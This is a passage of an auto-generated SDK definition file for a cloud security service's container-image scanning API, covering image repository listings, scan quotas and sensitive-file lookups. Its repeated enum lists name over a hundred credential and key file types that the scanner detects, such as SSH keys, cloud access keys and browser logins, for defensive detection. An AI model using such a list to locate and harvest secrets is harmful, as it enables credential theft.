    query['RepoNamespace'] = request.repoNamespace;
  }
  if (!Util.isUnset(request.scanRange)) {
    query['ScanRange'] = request.scanRange;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageListWithBaselineName',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageListWithBaselineName(request: DescribeImageListWithBaselineNameRequest): DescribeImageListWithBaselineNameResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageListWithBaselineNameWithOptions(request, runtime);
}

model DescribeImageRepoCriteriaRequest {
  value?: string(name='Value', example='2.0.2'),
}

model DescribeImageRepoCriteriaResponseBody = {
  criteriaList?: [ 
    {
      name?: string(name='Name', example='vulStatus'),
      type?: string(name='Type', example='select'),
      values?: string(name='Values', example='NO,YES'),
    }
  ](name='CriteriaList'),
  requestId?: string(name='RequestId', example='F35F45B0-5D6B-4238-BE02-A62D0760E840'),
}

model DescribeImageRepoCriteriaResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageRepoCriteriaResponseBody(name='body'),
}

async function describeImageRepoCriteriaWithOptions(request: DescribeImageRepoCriteriaRequest, runtime: Util.RuntimeOptions): DescribeImageRepoCriteriaResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.value)) {
    query['Value'] = request.value;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageRepoCriteria',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageRepoCriteria(request: DescribeImageRepoCriteriaRequest): DescribeImageRepoCriteriaResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageRepoCriteriaWithOptions(request, runtime);
}

model DescribeImageRepoDetailListRequest {
  criteria?: string(name='Criteria', example='[{"name":"vulStatus","value":"YES","logicalExp":"AND"}]'),
  currentPage?: int32(name='CurrentPage', example='1'),
  logicalExp?: string(name='LogicalExp', example='OR'),
  pageSize?: int32(name='PageSize', example='20'),
}

model DescribeImageRepoDetailListResponseBody = {
  imageRepoResponses?: [ 
    {
      alarmCount?: int32(name='AlarmCount', example='0'),
      alarmStatus?: string(name='AlarmStatus', example='NO'),
      endpoints?: string(name='Endpoints', example='[{"domains":["mucfc-test-registry-registry.cn-shenzhen.cr.aliyuncs.com"],"type":"internet"},{"domains":["mucfc-test-registry-registry-intranet.cn-shenzhen.cr.aliyuncs.com"],"type":"intranet"},{"domains":["mucfc-test-registry-registry-vpc.cn-shenzhen.cr.aliyuncs.com"],"type":"vpc"}]'),
      hcCount?: int32(name='HcCount', example='0'),
      hcStatus?: string(name='HcStatus', example='NO'),
      imageCount?: int32(name='ImageCount', example='3'),
      instanceId?: string(name='InstanceId', example='i-uf6fsg6xlmorug5****'),
      regionId?: string(name='RegionId', example='cn-shanghai'),
      registryType?: string(name='RegistryType', example='acr'),
      repoId?: string(name='RepoId', example='crr-2chlzf47w2rk****'),
      repoName?: string(name='RepoName', example='zeus'),
      repoNamespace?: string(name='RepoNamespace', example='test-dev'),
      riskStatus?: string(name='RiskStatus', example='NO'),
      vulCount?: int32(name='VulCount', example='0'),
      vulStatus?: string(name='VulStatus', example='NO'),
    }
  ](name='ImageRepoResponses'),
  pageInfo?: {
    count?: int32(name='Count', example='2'),
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='19'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='0B48AB3C-84FC-424D-A01D-B9270EF46038'),
}

model DescribeImageRepoDetailListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageRepoDetailListResponseBody(name='body'),
}

async function describeImageRepoDetailListWithOptions(request: DescribeImageRepoDetailListRequest, runtime: Util.RuntimeOptions): DescribeImageRepoDetailListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.logicalExp)) {
    query['LogicalExp'] = request.logicalExp;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageRepoDetailList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageRepoDetailList(request: DescribeImageRepoDetailListRequest): DescribeImageRepoDetailListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageRepoDetailListWithOptions(request, runtime);
}

model DescribeImageRepoListRequest {
  currentPage?: int32(name='CurrentPage', example='1'),
  fieldName?: string(name='FieldName', example='repoName'),
  fieldValue?: string(name='FieldValue', example='zeus'),
  operateType?: string(name='OperateType', example='count'),
  pageSize?: int32(name='PageSize', example='20'),
  repoName?: string(name='RepoName', example='script7'),
  repoNamespace?: string(name='RepoNamespace', example='libssh2'),
  targetType?: string(name='TargetType', example='Cluster'),
  type?: string(name='Type', example='containerNetwork'),
}

model DescribeImageRepoListResponseBody = {
  addTargetCount?: int32(name='AddTargetCount', example='20'),
  allTargetCount?: int32(name='AllTargetCount', example='25'),
  delTargetCount?: int32(name='DelTargetCount', example='5'),
  imageRepoList?: [ 
    {
      flag?: string(name='Flag', example='add'),
      repoName?: string(name='RepoName', example='zeus'),
      repoNamespace?: string(name='RepoNamespace', example='sas-script'),
    }
  ](name='ImageRepoList'),
  pageInfo?: {
    count?: int32(name='Count', example='2'),
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='83'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB3936FA7'),
}

model DescribeImageRepoListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageRepoListResponseBody(name='body'),
}

async function describeImageRepoListWithOptions(request: DescribeImageRepoListRequest, runtime: Util.RuntimeOptions): DescribeImageRepoListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.fieldName)) {
    query['FieldName'] = request.fieldName;
  }
  if (!Util.isUnset(request.fieldValue)) {
    query['FieldValue'] = request.fieldValue;
  }
  if (!Util.isUnset(request.operateType)) {
    query['OperateType'] = request.operateType;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.repoName)) {
    query['RepoName'] = request.repoName;
  }
  if (!Util.isUnset(request.repoNamespace)) {
    query['RepoNamespace'] = request.repoNamespace;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageRepoList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageRepoList(request: DescribeImageRepoListRequest): DescribeImageRepoListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageRepoListWithOptions(request, runtime);
}

model DescribeImageScanAuthCountResponseBody = {
  imageScan?: {
    imageScanCapacity?: long(name='ImageScanCapacity', description='The quota for container image scan.', example='15340'),
    instanceId?: string(name='InstanceId', description='The instance ID of Security Center.', example='sas-qdl123412****'),
    scanCount?: long(name='ScanCount', description='The consumed quota for container image scan.', example='5489'),
  }(name='ImageScan', description='The details about the quota for container image scan.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='892NYH839-0EDC-4CD0-A2EF-5BD294656C99'),
}

model DescribeImageScanAuthCountResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageScanAuthCountResponseBody(name='body'),
}

async function describeImageScanAuthCountWithOptions(runtime: Util.RuntimeOptions): DescribeImageScanAuthCountResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeImageScanAuthCount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageScanAuthCount(): DescribeImageScanAuthCountResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageScanAuthCountWithOptions(runtime);
}

model DescribeImageScanAuthorizationResponseBody = {
  authStatus?: {
    status?: boolean(name='Status'),
  }(name='AuthStatus'),
  requestId?: string(name='RequestId'),
}

model DescribeImageScanAuthorizationResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageScanAuthorizationResponseBody(name='body'),
}

async function describeImageScanAuthorizationWithOptions(runtime: Util.RuntimeOptions): DescribeImageScanAuthorizationResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeImageScanAuthorization',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageScanAuthorization(): DescribeImageScanAuthorizationResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageScanAuthorizationWithOptions(runtime);
}

model DescribeImageSensitiveFileByKeyRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  imageUuid?: string(name='ImageUuid', description='The UUID of the image.', example='0083a31ccf7c10367a6e783e8601****'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='20'),
  scanRange?: [ string ](name='ScanRange', description='The type of the asset that you want to scan. Valid values:

*   **image**
*   **container**'),
  sensitiveFileKey?: string(name='SensitiveFileKey', description='The alert type of the sensitive file. Valid values:

*   **npm_token**: NPM Token
*   **ftp_cfg**: FTP Config
*   **google\\_oauth_key**: Google OAuth Key
*   **planetscale_passwd**: Planetscale password
*   **github\\_ssh_key**: Github SSH Key
*   **msbuild\\_publish_profile**: MSBuild publish profile
*   **fastly\\_cdn_token**: Fastly CDN Token
*   **ssh\\_private_key**: SSH Private Key
*   **aws_cli**: AWS CLI Credentials
*   **cpanel\\_proftpd**: cPanel ProFTPd Credential
*   **postgresql_passwd**: PostgreSQl Passwd
*   **discord\\_client_cred**: Discord Client Credential
*   **rails_database**: Rails Database Config
*   **aws\\_access_key**: AWS Access Key
*   **esmtp_cfg**: ESMTP Config
*   **docker\\_registry_cfg**: Docker Registry Config
*   **pem**: PEM
*   **common_cred**: Common Credential
*   **sftp_cfg**: SFTP Config
*   **grafana_token**: Grafana Token
*   **slack_token**: Slack Token
*   **ec\\_private_key**: EC Private Key
*   **pypi_token**: PyPI Token
*   **finicity_token**: Finicity Token
*   **k8s\\_client_key**: Kubernetes Client Key
*   **git_cfg**: Git Config
*   **django_key**: Django Key
*   **jenkins_ssh**: Jenkins SSH Config
*   **openssh\\_private_key**: OPENSSH Private Key
*   **square_oauth**: Square OAuth Token
*   **typeform_token**: Typeform Token
*   **common\\_database_cfg**: Common Database Config
*   **wordpress\\_database_cfg**: Wordpress Database Config
*   **googlecloud\\_api_key**: Google Cloud API Key
*   **vscode_sftp**: VSCode SFTP Config
*   **apache_htpasswd**: Apache htpasswd
*   **planetscale_token**: Planetscale Token
*   **contentful\\_preview_token**: Contentful Preview Token
*   **php\\_database_cfg**: PHP Database Config
*   **atom\\_remote_sync**: Atom Remote Sync Config
*   **aws\\_session_token**: AWS Session Token
*   **atom\\_sftp_cfg**: Atom SFTP Config
*   **asana\\_client\\_private_key**: Asana Client Private Key
*   **tencentcloud_ak**: Tencent Cloud SecretId
*   **rsa\\_private_key**: RSA Private Key
*   **github\\_personal_token**: Github Personal Token
*   **pgp**: PGP
*   **stripe_skpk**: Stripe Secret Key
*   **square_token**: Square Token
*   **rails_carrierwave**: Rails Carrierwave Credential
*   **dbeaver\\_database_cfg**: DBeaver Database Config
*   **robomongo_cred**: Robomongo Credential
*   **github\\_oauth_token**: Github OAuth Token
*   **pulumi_token**: Pulumi Token
*   **ventrilo_voip**: Ventrilo VoIP Server Config
*   **macos_keychain**: macOS Keychain
*   **amazon\\_mws_token**: Amazon MWS Token
*   **dynatrace_token**: Dynatrace Token
*   **java_keystore**: Java Keystore
*   **microsoft_sdf**: Microsoft SDF
*   **kubernetes\\_dashboard_cred**: Kubernetes Dashboard User Credential
*   **atlassian_token**: Atlassian Token
*   **rdp**: RDP
*   **mailgun_key**: Mailgun Webhook Signing Key
*   **mailchimp\\_api_key**: Mailchimp API Key
*   **netrc_cfg**: .netrc config
*   **openvpn_cfg**: OpenVPN Config
*   **github\\_refresh_token**: Github Refresh Token
*   **salesforce**: Salesforce Credential
*   **sendinblue**: Sendinblue Token
*   **pkcs\\_private_key**: PKCS Private Key
*   **rubyonrails_passwd**: Ruby on Rails Passwd
*   **filezilla_ftp**: FileZilla FTP Config
*   **databricks_token**: Databricks Token
*   **gitLab\\_personal_token**: GitLab Personal Token
*   **rails\\_master_key**: Rails Master Key
*   **sqlite**: SQLite3/SQLite Database
*   **firefox_logins**: Firefox Login Config
*   **mailgun\\_private_token**: Mailgun Private Token
*   **joomla_cfg**: Joomla Config
*   **hashicorp\\_terraform_token**: Hashicorp Terraform Token
*   **jetbrains_ides**: Jetbrains IDEs Config
*   **heroku\\_api_key**: Heroku API key
*   **messagebird_token**: MessageBird Token
*   **github\\_app_token**: Github App Token
*   **hashicorp\\_vault_token**: Hashicorp Vault Token
*   **pgp\\_private_key**: PGP Private Key
*   **sshpasswd**: SSH password
*   **huaweicloud_ak**: Huaei Cloud Access Key
*   **aws_s3cmd**: AWS S3cmd Config
*   **php_config**: php Config
*   **common\\_private_key**: Common Private Key Type
*   **microsoft_mdf**: Microsoft MDF
*   **mediawiki_cfg**: MediaWiki Config
*   **jenkins_cred**: Jenkins Credential
*   **rubygems_cred**: Rubygems Credential
*   **clojars_token**: Clojars Token
*   **phoenix\\_web_passwd**: Phoenix Web Credential
*   **puttygen\\_private_key**: PuTTYgen Private Key
*   **google\\_oauth_token**: Google Oauth Token
*   **rubyonrails_cfg**: Ruby On Rails Database Config
*   **lob\\_api_key**: Lob API Key
*   **pkcs_cred**: PKCS#12
*   **otr\\_private_key**: OTR Private Key
*   **contentful\\_delivery_token**: Contentful Delivery Token
*   **digital\\_ocean_tugboat**: Digital Ocean Tugboat Config
*   **dsa\\_private_key**: DSA Private Key
*   **rails\\_app_token**: Rails App Token
*   **git_cred**: Git User Credential
*   **newrelic\\_api_key**: New Relic User API Key
*   **github_hub**: Github Token
*   **rubygem**: Rubygem Token', example='google_oauth_key'),
}

model DescribeImageSensitiveFileByKeyShrinkRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  imageUuid?: string(name='ImageUuid', description='The UUID of the image.', example='0083a31ccf7c10367a6e783e8601****'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='20'),
  scanRangeShrink?: string(name='ScanRange', description='The type of the asset that you want to scan. Valid values:

*   **image**
*   **container**'),
  sensitiveFileKey?: string(name='SensitiveFileKey', description='The alert type of the sensitive file. Valid values:

*   **npm_token**: NPM Token
*   **ftp_cfg**: FTP Config
*   **google\\_oauth_key**: Google OAuth Key
*   **planetscale_passwd**: Planetscale password
*   **github\\_ssh_key**: Github SSH Key
*   **msbuild\\_publish_profile**: MSBuild publish profile
*   **fastly\\_cdn_token**: Fastly CDN Token
*   **ssh\\_private_key**: SSH Private Key
*   **aws_cli**: AWS CLI Credentials
*   **cpanel\\_proftpd**: cPanel ProFTPd Credential
*   **postgresql_passwd**: PostgreSQl Passwd
*   **discord\\_client_cred**: Discord Client Credential
*   **rails_database**: Rails Database Config
*   **aws\\_access_key**: AWS Access Key
*   **esmtp_cfg**: ESMTP Config
*   **docker\\_registry_cfg**: Docker Registry Config
*   **pem**: PEM
*   **common_cred**: Common Credential
*   **sftp_cfg**: SFTP Config
*   **grafana_token**: Grafana Token
*   **slack_token**: Slack Token
*   **ec\\_private_key**: EC Private Key
*   **pypi_token**: PyPI Token
*   **finicity_token**: Finicity Token
*   **k8s\\_client_key**: Kubernetes Client Key
*   **git_cfg**: Git Config
*   **django_key**: Django Key
*   **jenkins_ssh**: Jenkins SSH Config
*   **openssh\\_private_key**: OPENSSH Private Key
*   **square_oauth**: Square OAuth Token
*   **typeform_token**: Typeform Token
*   **common\\_database_cfg**: Common Database Config
*   **wordpress\\_database_cfg**: Wordpress Database Config
*   **googlecloud\\_api_key**: Google Cloud API Key
*   **vscode_sftp**: VSCode SFTP Config
*   **apache_htpasswd**: Apache htpasswd
*   **planetscale_token**: Planetscale Token
*   **contentful\\_preview_token**: Contentful Preview Token
*   **php\\_database_cfg**: PHP Database Config
*   **atom\\_remote_sync**: Atom Remote Sync Config
*   **aws\\_session_token**: AWS Session Token
*   **atom\\_sftp_cfg**: Atom SFTP Config
*   **asana\\_client\\_private_key**: Asana Client Private Key
*   **tencentcloud_ak**: Tencent Cloud SecretId
*   **rsa\\_private_key**: RSA Private Key
*   **github\\_personal_token**: Github Personal Token
*   **pgp**: PGP
*   **stripe_skpk**: Stripe Secret Key
*   **square_token**: Square Token
*   **rails_carrierwave**: Rails Carrierwave Credential
*   **dbeaver\\_database_cfg**: DBeaver Database Config
*   **robomongo_cred**: Robomongo Credential
*   **github\\_oauth_token**: Github OAuth Token
*   **pulumi_token**: Pulumi Token
*   **ventrilo_voip**: Ventrilo VoIP Server Config
*   **macos_keychain**: macOS Keychain
*   **amazon\\_mws_token**: Amazon MWS Token
*   **dynatrace_token**: Dynatrace Token
*   **java_keystore**: Java Keystore
*   **microsoft_sdf**: Microsoft SDF
*   **kubernetes\\_dashboard_cred**: Kubernetes Dashboard User Credential
*   **atlassian_token**: Atlassian Token
*   **rdp**: RDP
*   **mailgun_key**: Mailgun Webhook Signing Key
*   **mailchimp\\_api_key**: Mailchimp API Key
*   **netrc_cfg**: .netrc config
*   **openvpn_cfg**: OpenVPN Config
*   **github\\_refresh_token**: Github Refresh Token
*   **salesforce**: Salesforce Credential
*   **sendinblue**: Sendinblue Token
*   **pkcs\\_private_key**: PKCS Private Key
*   **rubyonrails_passwd**: Ruby on Rails Passwd
*   **filezilla_ftp**: FileZilla FTP Config
*   **databricks_token**: Databricks Token
*   **gitLab\\_personal_token**: GitLab Personal Token
*   **rails\\_master_key**: Rails Master Key
*   **sqlite**: SQLite3/SQLite Database
*   **firefox_logins**: Firefox Login Config
*   **mailgun\\_private_token**: Mailgun Private Token
*   **joomla_cfg**: Joomla Config
*   **hashicorp\\_terraform_token**: Hashicorp Terraform Token
*   **jetbrains_ides**: Jetbrains IDEs Config
*   **heroku\\_api_key**: Heroku API key
*   **messagebird_token**: MessageBird Token
*   **github\\_app_token**: Github App Token
*   **hashicorp\\_vault_token**: Hashicorp Vault Token
*   **pgp\\_private_key**: PGP Private Key
*   **sshpasswd**: SSH password
*   **huaweicloud_ak**: Huaei Cloud Access Key
*   **aws_s3cmd**: AWS S3cmd Config
*   **php_config**: php Config
*   **common\\_private_key**: Common Private Key Type
*   **microsoft_mdf**: Microsoft MDF
*   **mediawiki_cfg**: MediaWiki Config
*   **jenkins_cred**: Jenkins Credential
*   **rubygems_cred**: Rubygems Credential
*   **clojars_token**: Clojars Token
*   **phoenix\\_web_passwd**: Phoenix Web Credential
*   **puttygen\\_private_key**: PuTTYgen Private Key
*   **google\\_oauth_token**: Google Oauth Token
*   **rubyonrails_cfg**: Ruby On Rails Database Config
*   **lob\\_api_key**: Lob API Key
*   **pkcs_cred**: PKCS#12
*   **otr\\_private_key**: OTR Private Key
*   **contentful\\_delivery_token**: Contentful Delivery Token
*   **digital\\_ocean_tugboat**: Digital Ocean Tugboat Config
*   **dsa\\_private_key**: DSA Private Key
*   **rails\\_app_token**: Rails App Token
*   **git_cred**: Git User Credential
*   **newrelic\\_api_key**: New Relic User API Key
*   **github_hub**: Github Token
*   **rubygem**: Rubygem Token', example='google_oauth_key'),
}

model DescribeImageSensitiveFileByKeyResponseBody = {
  code?: string(name='Code', description='The status code returned. If the 200 status code is returned, the request was successful.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    lastRowKey?: string(name='LastRowKey', description='The key of the last data entry.', example='CAESGgoSChAKDGNvbXBsZXRlVGltZRABCgQiAggAGAAiQAoJAGYXFWIAAAAACjMDLgAAADFTNzMyZDMwMzAzMDM1Mzc3Njc4MzA2ODY5NmI2YTY1Nzg2NTcxNjE2NDc4NjE='),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='100'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='CE500770-42D3-442E-9DDD-156E0F9F3B45'),
  sensitiveFileList?: [ 
    {
      advice?: string(name='Advice', description='The suggestion.', example='Assess risks based on business conditions, remove risky content, and rebuild image'),
      filePath?: string(name='FilePath', description='The file path.', example='/usr/lib/abc.txt'),
      firstScanTime?: long(name='FirstScanTime', description='The timestamp when the first scan was performed. Unit: milliseconds.', example='1663321552000'),
      lastScanTime?: long(name='LastScanTime', description='The timestamp when the last scan was performed. Unit: milliseconds.', example='1663691592000'),
      layerDigest?: string(name='LayerDigest', description='The digest of the image layer.', example='0083a31cc0083a31ccf7c10367a6e783e8601e290f7c10367a6e783e860****'),
      promt?: string(name='Promt', description='The sensitive content.', example='AKPIDteow289f9s************'),
      riskLevel?: string(name='RiskLevel', description='The risk level of the sensitive file. Valid values:

*   **high**
*   **medium**
*   **low**', example='low'),
      sensitiveFileKey?: string(name='SensitiveFileKey', description='The alert type of the sensitive file. Valid values:

*   **npm_token**: NPM Token
*   **ftp_cfg**: FTP Config
*   **google\\_oauth_key**: Google OAuth Key
*   **planetscale_passwd**: Planetscale password
*   **github\\_ssh_key**: Github SSH Key
*   **msbuild\\_publish_profile**: MSBuild publish profile
*   **fastly\\_cdn_token**: Fastly CDN Token
*   **ssh\\_private_key**: SSH Private Key
*   **aws_cli**: AWS CLI Credentials
*   **cpanel\\_proftpd**: cPanel ProFTPd Credential
*   **postgresql_passwd**: PostgreSQl Passwd
*   **discord\\_client_cred**: Discord Client Credential
*   **rails_database**: Rails Database Config
*   **aws\\_access_key**: AWS Access Key
*   **esmtp_cfg**: ESMTP Config
*   **docker\\_registry_cfg**: Docker Registry Config
*   **pem**: PEM
*   **common_cred**: Common Credential
*   **sftp_cfg**: SFTP Config
*   **grafana_token**: Grafana Token
*   **slack_token**: Slack Token
*   **ec\\_private_key**: EC Private Key
*   **pypi_token**: PyPI Token
*   **finicity_token**: Finicity Token
*   **k8s\\_client_key**: Kubernetes Client Key
*   **git_cfg**: Git Config
*   **django_key**: Django Key
*   **jenkins_ssh**: Jenkins SSH Config
*   **openssh\\_private_key**: OPENSSH Private Key
*   **square_oauth**: Square OAuth Token
*   **typeform_token**: Typeform Token
*   **common\\_database_cfg**: Common Database Config
*   **wordpress\\_database_cfg**: Wordpress Database Config
*   **googlecloud\\_api_key**: Google Cloud API Key
*   **vscode_sftp**: VSCode SFTP Config
*   **apache_htpasswd**: Apache htpasswd
*   **planetscale_token**: Planetscale Token
*   **contentful\\_preview_token**: Contentful Preview Token
*   **php\\_database_cfg**: PHP Database Config
*   **atom\\_remote_sync**: Atom Remote Sync Config
*   **aws\\_session_token**: AWS Session Token
*   **atom\\_sftp_cfg**: Atom SFTP Config
*   **asana\\_client\\_private_key**: Asana Client Private Key
*   **tencentcloud_ak**: Tencent Cloud SecretId
*   **rsa\\_private_key**: RSA Private Key
*   **github\\_personal_token**: Github Personal Token
*   **pgp**: PGP
*   **stripe_skpk**: Stripe Secret Key
*   **square_token**: Square Token
*   **rails_carrierwave**: Rails Carrierwave Credential
*   **dbeaver\\_database_cfg**: DBeaver Database Config
*   **robomongo_cred**: Robomongo Credential
*   **github\\_oauth_token**: Github OAuth Token
*   **pulumi_token**: Pulumi Token
*   **ventrilo_voip**: Ventrilo VoIP Server Config
*   **macos_keychain**: macOS Keychain
*   **amazon\\_mws_token**: Amazon MWS Token
*   **dynatrace_token**: Dynatrace Token
*   **java_keystore**: Java Keystore
*   **microsoft_sdf**: Microsoft SDF
*   **kubernetes\\_dashboard_cred**: Kubernetes Dashboard User Credential
*   **atlassian_token**: Atlassian Token
*   **rdp**: RDP
*   **mailgun_key**: Mailgun Webhook Signing Key
*   **mailchimp\\_api_key**: Mailchimp API Key
*   **netrc_cfg**: .netrc config
*   **openvpn_cfg**: OpenVPN Config
*   **github\\_refresh_token**: Github Refresh Token
*   **salesforce**: Salesforce Credential
*   **sendinblue**: Sendinblue Token
*   **pkcs\\_private_key**: PKCS Private Key
*   **rubyonrails_passwd**: Ruby on Rails Passwd
*   **filezilla_ftp**: FileZilla FTP Config
*   **databricks_token**: Databricks Token
*   **gitLab\\_personal_token**: GitLab Personal Token
*   **rails\\_master_key**: Rails Master Key
*   **sqlite**: SQLite3/SQLite Database
*   **firefox_logins**: Firefox Login Config
*   **mailgun\\_private_token**: Mailgun Private Token
*   **joomla_cfg**: Joomla Config
*   **hashicorp\\_terraform_token**: Hashicorp Terraform Token
*   **jetbrains_ides**: Jetbrains IDEs Config
*   **heroku\\_api_key**: Heroku API key
*   **messagebird_token**: MessageBird Token
*   **github\\_app_token**: Github App Token
*   **hashicorp\\_vault_token**: Hashicorp Vault Token
*   **pgp\\_private_key**: PGP Private Key
*   **sshpasswd**: SSH password
*   **huaweicloud_ak**: Huaei Cloud Access Key
*   **aws_s3cmd**: AWS S3cmd Config
*   **php_config**: php Config
*   **common\\_private_key**: Common Private Key Type
*   **microsoft_mdf**: Microsoft MDF
*   **mediawiki_cfg**: MediaWiki Config
*   **jenkins_cred**: Jenkins Credential
*   **rubygems_cred**: Rubygems Credential
*   **clojars_token**: Clojars Token
*   **phoenix\\_web_passwd**: Phoenix Web Credential
*   **puttygen\\_private_key**: PuTTYgen Private Key
*   **google\\_oauth_token**: Google Oauth Token
*   **rubyonrails_cfg**: Ruby On Rails Database Config
*   **lob\\_api_key**: Lob API Key
*   **pkcs_cred**: PKCS#12
*   **otr\\_private_key**: OTR Private Key
*   **contentful\\_delivery_token**: Contentful Delivery Token
*   **digital\\_ocean_tugboat**: Digital Ocean Tugboat Config
*   **dsa\\_private_key**: DSA Private Key
*   **rails\\_app_token**: Rails App Token
*   **git_cred**: Git User Credential
*   **newrelic\\_api_key**: New Relic User API Key
*   **github_hub**: Github Token
*   **rubygem**: Rubygem Token', example='google_oauth_key'),
      sensitiveFileName?: string(name='SensitiveFileName', description='The alert type name of the sensitive file.', example='Google OAuth Key'),
    }
  ](name='SensitiveFileList', description='An array that consists of the sensitive files.'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model DescribeImageSensitiveFileByKeyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageSensitiveFileByKeyResponseBody(name='body'),
}

async function describeImageSensitiveFileByKeyWithOptions(tmpReq: DescribeImageSensitiveFileByKeyRequest, runtime: Util.RuntimeOptions): DescribeImageSensitiveFileByKeyResponse {
  Util.validateModel(tmpReq);
  var request = new DescribeImageSensitiveFileByKeyShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.scanRange)) {
    request.scanRangeShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.scanRange, 'ScanRange', 'json');
  }
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.imageUuid)) {
    query['ImageUuid'] = request.imageUuid;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.scanRangeShrink)) {
    query['ScanRange'] = request.scanRangeShrink;
  }
  if (!Util.isUnset(request.sensitiveFileKey)) {
    query['SensitiveFileKey'] = request.sensitiveFileKey;
  }
  var req = new OpenApi.OpenApiRequest{ 
